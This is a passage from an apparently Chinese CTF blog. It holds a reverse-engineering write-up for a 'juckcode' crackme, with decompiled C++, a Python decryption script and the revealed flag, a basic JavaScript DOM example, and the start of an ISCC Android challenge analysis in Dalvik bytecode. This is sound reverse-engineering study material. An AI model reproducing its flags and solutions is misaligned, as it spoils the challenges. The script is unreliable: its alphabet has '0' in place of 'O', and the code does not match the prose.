class="keyword">for</span> ( n = <span class="number">0</span>; ; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    v31 = &amp;v42;</span><br><span class="line">    v22 = &amp;v43;</span><br><span class="line">    v31 += <span class="built_in">strlen</span>(v31);</span><br><span class="line">    v21 = ++v31 - &amp;v43;</span><br><span class="line">    <span class="keyword">if</span> ( n &gt;= v31 - &amp;v43 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(&amp;v42 + n) += <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = sub_4050D0(<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;v42);</span><br><span class="line">  <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v15, sub_405430);</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  LOBYTE(v48) = <span class="number">5</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v39);</span><br><span class="line">  LOBYTE(v48) = <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v38);</span><br><span class="line">  LOBYTE(v48) = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v37);</span><br><span class="line">  LOBYTE(v48) = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v36);</span><br><span class="line">  LOBYTE(v48) = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v40);</span><br><span class="line">  LOBYTE(v48) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;input);</span><br><span class="line">  v48 = <span class="number">-1</span>;</span><br><span class="line">  sub_403870();</span><br><span class="line">  <span class="keyword">return</span> v20;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先判断了下文件是否读取成功,随后base64.base64encode大概的传参顺序是加密后的字符串,待加密的flag的首地址,flag的长度.大概的顺序就是:</p>
<ul>
<li>input加密一次</li>
<li>input每一位加64</li>
<li>input加密一次</li>
<li>input每一位再次右移7位</li>
<li>input加密一次</li>
<li>input每一位减去158</li>
<li>input加密一次</li>
</ul>
<p>这样会得到四个字符base64后的字符长度相同的字符串.随后到达</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line"><span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; len(&amp;v40); ++l )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *sub_401C80(&amp;v40, l) != <span class="number">61</span> )</span><br><span class="line">    *(&amp;Src + <span class="number">4</span> * l) = *sub_401C80(&amp;v40, l);</span><br><span class="line">  </span><br><span class="line">  *(&amp;Dst + <span class="number">4</span> * l) = *sub_401C80(&amp;v36, l);</span><br><span class="line">  v47[<span class="number">4</span> * l] = *sub_401C80(&amp;v37, l);</span><br><span class="line">  *(&amp;v46 + <span class="number">4</span> * l) = *sub_401C80(&amp;v38, l);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>v36 v37 v38 v40是刚才base64的字符串</li>
<li>sub_401C80函数,是取下标操作,*sub_401C80(&amp;v37, l)的意思就是v37[l]</li>
<li>查看v47,v46,Dst,Src,发现其在栈内的分布是连续的四位</li>
<li>所以可以看出来,依次从四个base后的字符串中提取出一个,组成一个新的base后的字符串</li>
</ul>
<p>随后程序进行一次base64decode,将解码后的16进制转换成字符串,然后每一位减去16,打印出来.</p>
<h1 id="开始逆向"><a href="#开始逆向" class="headerlink" title="开始逆向"></a>开始逆向</h1><p>首先还原16进制,然后将其base64encode,提取出i%4==0的对应位,然后base64encode即可.<br>下面是解密代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">"FFIF@@IqqIH@sGBBsBHFAHH@FFIuB@tvrrHHrFuBD@qqqHH@GFtuB@EIqrHHCDuBsBqurHH@EuGuB@trqrHHCDuBsBruvHH@FFIF@@AHqrHHEEFBsBGtvHH@FBHuB@trqrHHADFBD@rquHH@FurF@@IqqrHHvGuBD@tCDHH@EuGuB@tvrrHHCDuBD@tCDHH@FuruB@tvrIH@@DBBsBGtvHH@GquuB@EIqrHHvGuBsBtGEHH@EuGuB@tvrIH@BDqBsBIFEHH@GFtF@@IqqrHHEEFBD@srBHH@GBsuB@trqrHHIFFBD@rquHH@FFIuB@tvrrHHtCDB@@"</span></span><br><span class="line">s1 = <span class="string">""</span></span><br><span class="line">base = <span class="string">'ABCDEFGHIJKLMN0PQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    s1 += (chr(ord(i) - <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s1) / <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        flag += base[int(s1[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>], base=<span class="number">16</span>) &gt;&gt; <span class="number">2</span>]</span><br><span class="line">flag += <span class="string">'='</span> * (<span class="number">4</span> - len(flag) % <span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> base64.b64decode(flag)</span><br></pre></td></tr></table></figure>

<h2 id="flag-flag-juck-code-cannot-stop-you-reversing"><a href="#flag-flag-juck-code-cannot-stop-you-reversing" class="headerlink" title="flag: flag{juck_code_cannot_stop_you_reversing}"></a>flag: flag{juck_code_cannot_stop_you_reversing}</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/juckcode/" data-id="cjyn83qfl0034icthmpmk7q33" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-javascript0x1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/javascript0x1/" class="article-date">
  <time datetime="2019-07-28T17:11:01.690Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/FE/">FE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/javascript0x1/">javascript 0x00</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>实例代码:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>JavaScript练习<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"d"</span>&gt;</span></span><br><span class="line">JavaScript</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">function myn()</span><br><span class="line">&#123;</span><br><span class="line">x=document.getElementById("d");  // 找到元素</span><br><span class="line">x.innerHTML="Hello JavaScript!";    // 改变内容</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myn()"</span>&gt;</span>chance<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> &gt;</span>大黄的py<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"h"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> &gt;</span>mozhu的py<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"m"</span>&gt;</span>19<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">        function f()&#123;</span><br><span class="line">            var content = document.getElementById("h").innerHTML;</span><br><span class="line">            document.getElementById("h").innerHTML=Number(content) + 1;</span><br><span class="line">            var content = document.getElementById("m").innerHTML;</span><br><span class="line">            document.getElementById("m").innerHTML=Number(content) - 1;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span> = <span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"f()"</span>&gt;</span>button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/javascript0x1/" data-id="cjyn83qek0019icthz247o676" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-iscc安卓逆向" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/iscc安卓逆向/" class="article-date">
  <time datetime="2019-07-28T17:11:01.681Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/iscc安卓逆向/">ISCC 决赛 android 1000</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="iscc决赛android-1000"><a href="#iscc决赛android-1000" class="headerlink" title="iscc决赛android 1000"></a>iscc决赛android 1000</h1><h2 id="解题前序"><a href="#解题前序" class="headerlink" title="解题前序"></a>解题前序</h2><ul>
<li>查了一下apk内部,可以拿到一个.dex,一个.jar和两个.so</li>
<li>解.jar发现其实是一个加密的.dex,将dex转成jar以后发现checkflag的函数</li>
</ul>
<h2 id="分析checkflag函数"><a href="#分析checkflag函数" class="headerlink" title="分析checkflag函数"></a>分析checkflag函数</h2><ul>
<li>发现其中先定义了一个二维数组,然后将其传入一个enc函数,这个函数是反编译不出来的,应该是加了壳</li>
<li>后分析libcore.so函数,发现其中有一个函数名以及函数的操作很可疑,函数首先将一串加密过的字符串还原,然后经过几个类似于取解密后字符串中的括号括起来的部分,按照函数原有逻辑顺序解一下,发现了主要check函数的名字,后面还接了地址(0x159CBC)</li>
<li>根据地址定位函数,IDA中那块字节码是乱掉的,不能被翻译成汇编,所以现将其变成jar汇编,然后来分析汇编</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">CODE:00159BCC # Method 0 (0x0)</span><br><span class="line">CODE:00159BCC                 .short 0xC              # Number of registers : 0xc</span><br><span class="line">CODE:00159BCE                 .short 1                # Size of input args (in words) : 0x1</span><br><span class="line">CODE:00159BD0                 .short 2                # Size of output args (in words) : 0x2</span><br><span class="line">CODE:00159BD2                 .short 0                # Number of try_items : 0x0</span><br><span class="line">CODE:00159BD4                 .int byte_3028B7        # Debug info</span><br><span class="line">CODE:00159BD8                 .int 0xBB               # Size of bytecode (in 16-bit units): 0xbb</span><br><span class="line">CODE:00159BDC # ---------------------------------------------------------------------------</span><br><span class="line">CODE:00159BDC                 const/4                         v10, 2</span><br><span class="line">CODE:00159BDE                 const/4                         v9, 1</span><br><span class="line">CODE:00159BE0                 const/4                         v8, 0</span><br><span class="line">CODE:00159BE2                 .prologue_end</span><br><span class="line">CODE:00159BE2                 .line 15</span><br><span class="line">CODE:00159BE2                 const/4                         v2, 0</span><br><span class="line">CODE:00159BE4                 .line 16</span><br><span class="line">CODE:00159BE4                 new-instance                    v0, &lt;t: StringBuilder&gt;</span><br><span class="line">CODE:00159BE8                 invoke-direct                   &#123;v0&#125;, &lt;void StringBuilder.&lt;init&gt;() imp. @ _def_StringBuilder__init_@V&gt;</span><br><span class="line">CODE:00159BEE                 .line 17</span><br><span class="line">CODE:00159BEE                 const/4                         v1, 0</span><br><span class="line">CODE:00159BF0</span><br><span class="line">CODE:00159BF0 loc_159BF0:                             # CODE XREF: CODE:00159D44↓j</span><br><span class="line">CODE:00159BF0                 invoke-virtual                  &#123;v11&#125;, &lt;int String.length() imp. @ _def_String_length@I&gt;</span><br><span class="line">CODE:00159BF6                 move-result                     v5</span><br><span class="line">CODE:00159BF8                 if-ge                           v1, v5, loc_159D48</span><br><span class="line">CODE:00159BFC                 .line 18</span><br><span class="line">CODE:00159BFC                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159C00                 aget-object                     v5, v5, v8</span><br><span class="line">CODE:00159C04                 aget                            v5, v5, v8</span><br><span class="line">CODE:00159C08                 invoke-virtual                  &#123;v11, v1&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159C0E                 move-result                     v6</span><br><span class="line">CODE:00159C10                 add-int/lit8                    v6, v6, -0x41</span><br><span class="line">CODE:00159C14                 mul-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C16                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C1A                 aget-object                     v6, v6, v8</span><br><span class="line">CODE:00159C1E                 aget                            v6, v6, v9</span><br><span class="line">CODE:00159C22                 add-int/lit8                    v7, v1, 1</span><br><span class="line">CODE:00159C26                 .line 19</span><br><span class="line">CODE:00159C26                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159C2C                 move-result                     v7</span><br><span class="line">CODE:00159C2E                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159C32                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159C34                 add-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C36                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C3A                 aget-object                     v6, v6, v8</span><br><span class="line">CODE:00159C3E                 aget                            v6, v6, v10</span><br><span class="line">CODE:00159C42                 add-int/lit8                    v7, v1, 2</span><br><span class="line">CODE:00159C46                 .line 20</span><br><span class="line">CODE:00159C46                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159C4C                 move-result                     v7</span><br><span class="line">CODE:00159C4E                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159C52                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159C54                 add-int                         v2, v5, v6</span><br><span class="line">CODE:00159C58                 .line 21</span><br><span class="line">CODE:00159C58                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159C5C                 aget-object                     v5, v5, v9</span><br><span class="line">CODE:00159C60                 aget                            v5, v5, v8</span><br><span class="line">CODE:00159C64                 invoke-virtual                  &#123;v11, v1&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159C6A                 move-result                     v6</span><br><span class="line">CODE:00159C6C                 add-int/lit8                    v6, v6, -0x41</span><br><span class="line">CODE:00159C70                 mul-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C72                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C76                 aget-object                     v6, v6, v9</span><br><span class="line">CODE:00159C7A                 aget                            v6, v6, v9</span><br><span class="line">CODE:00159C7E                 add-int/lit8                    v7, v1, 1</span><br><span class="line">CODE:00159C82                 .line 22</span><br><span class="line">CODE:00159C82                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159C88                 move-result                     v7</span><br><span class="line">CODE:00159C8A                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159C8E                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159C90                 add-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C92                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C96                 aget-object                     v6, v6, v9</span><br><span class="line">CODE:00159C9A                 aget                            v6, v6, v10</span><br><span class="line">CODE:00159C9E                 add-int/lit8                    v7, v1, 2</span><br><span class="line">CODE:00159CA2                 .line 23</span><br><span class="line">CODE:00159CA2                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159CA8                 move-result                     v7</span><br><span class="line">CODE:00159CAA                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159CAE                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159CB0                 add-int                         v3, v5, v6</span><br><span class="line">CODE:00159CB4                 .line 24</span><br><span class="line">CODE:00159CB4                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159CB8                 aget-object                     v5, v5, v10</span><br><span class="line">CODE:00159CBC                 aget                            v5, v5, v8</span><br><span class="line">CODE:00159CC0                 invoke-virtual                  &#123;v11, v1&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159CC6                 move-result                     v6</span><br><span class="line">CODE:00159CC8                 add-int/lit8                    v6, v6, -0x41</span><br><span class="line">CODE:00159CCC                 mul-int/2addr                   v5, v6</span><br><span class="line">CODE:00159CCE                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159CD2                 aget-object                     v6, v6, v10</span><br><span class="line">CODE:00159CD6                 aget                            v6, v6, v9</span><br><span class="line">CODE:00159CDA                 add-int/lit8                    v7, v1, 1</span><br><span class="line">CODE:00159CDE                 .line 25</span><br><span class="line">CODE:00159CDE                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159CE4                 move-result                     v7</span><br><span class="line">CODE:00159CE6                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159CEA                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159CEC                 add-int/2addr                   v5, v6</span><br><span class="line">CODE:00159CEE                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159CF2                 aget-object                     v6, v6, v10</span><br><span class="line">CODE:00159CF6                 aget                            v6, v6, v10</span><br><span class="line">CODE:00159CFA                 add-int/lit8                    v7, v1, 2</span><br><span class="line">CODE:00159CFE                 .line 26</span><br><span class="line">CODE:00159CFE                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159D04                 move-result                     v7</span><br><span class="line">CODE:00159D06                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159D0A                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159D0C                 add-int                         v4, v5, v6</span><br><span class="line">CODE:00159D10                 .line 27</span><br><span class="line">CODE:00159D10                 rem-int/lit8                    v5, v2, 0x1A</span><br><span class="line">CODE:00159D14                 add-int/lit8                    v5, v5, 0x41</span><br><span class="line">CODE:00159D18                 int-to-char                     v5, v5</span><br><span class="line">CODE:00159D1A                 invoke-virtual                  &#123;v0, v5&#125;, &lt;ref StringBuilder.append(char) imp. @ _def_StringBuilder_append@LC&gt;</span><br><span class="line">CODE:00159D20                 .line 28</span><br><span class="line">CODE:00159D20                 rem-int/lit8                    v5, v3, 0x1A</span><br><span class="line">CODE:00159D24                 add-int/lit8                    v5, v5, 0x41</span><br><span class="line">CODE:00159D28                 int-to-char                     v5, v5</span><br><span class="line">CODE:00159D2A                 invoke-virtual                  &#123;v0, v5&#125;, &lt;ref StringBuilder.append(char) imp. @ _def_StringBuilder_append@LC&gt;</span><br><span class="line">CODE:00159D30                 .line 29</span><br><span class="line">CODE:00159D30                 rem-int/lit8                    v5, v4, 0x1A</span><br><span class="line">CODE:00159D34                 add-int/lit8                    v5, v5, 0x41</span><br><span class="line">CODE:00159D38                 int-to-char                     v5, v5</span><br><span class="line">CODE:00159D3A                 invoke-virtual                  &#123;v0, v5&#125;, &lt;ref StringBuilder.append(char) imp. @ _def_StringBuilder_append@LC&gt;</span><br><span class="line">CODE:00159D40                 .line 17</span><br><span class="line">CODE:00159D40                 add-int/lit8                    v1, v1, 3</span><br><span class="line">CODE:00159D44                 goto/16                         loc_159BF0</span><br><span class="line">CODE:00159D48 # ---------------------------------------------------------------------------</span><br><span class="line">CODE:00159D48 .end local &apos;temp2&apos;</span><br><span class="line">CODE:00159D48 .end local &apos;temp3&apos;</span><br><span 